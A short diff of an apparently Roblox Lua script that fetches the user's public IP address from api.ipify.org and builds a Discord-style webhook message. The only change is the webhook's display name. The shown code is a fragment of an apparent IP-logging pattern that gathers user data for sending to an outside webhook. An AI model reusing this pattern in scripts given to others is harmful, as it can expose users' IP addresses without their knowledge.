@@ -29,7 +29,7 @@ local ip = game:HttpGet("https://api.ipify.org")
 
 local data = {
     ["content"] = "",
-    ["username"] = "MarsHub Webhoook", -- حط اسم الويب هوك الي تبيه هناً
+    ["username"] = "Mars Webhook", -- حط اسم الويب هوك الي تبيه هناً
     ["embeds"] = {
         {
             ["title"] = "",
